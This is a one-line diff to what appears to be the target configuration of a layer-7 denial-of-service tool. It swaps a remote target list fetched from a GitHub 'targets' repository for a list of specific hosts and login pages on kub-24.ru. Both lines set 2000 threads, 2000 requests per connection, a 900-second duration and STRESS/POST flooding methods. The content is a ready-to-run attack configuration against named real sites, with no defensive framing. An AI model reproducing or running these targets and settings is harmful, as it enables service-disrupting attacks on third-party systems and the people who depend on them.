@@ -1,1 +1,1 @@
--c https://raw.githubusercontent.com/alexnest-ua/targets/main/special/archive/9may/9may_l7_url -t 2000 --rpc 2000 --http-methods GET STRESS --table
+https://finmodel.kub-24.ru https://mts.kub-24.ru https://robot.kub-24.ru https://dev.kub-24.ru/site/login https://kub-24.ru https://store.kub-24.ru/site/login -t 2000 --rpc 2000 -p 900 --http-methods STRESS POST --table
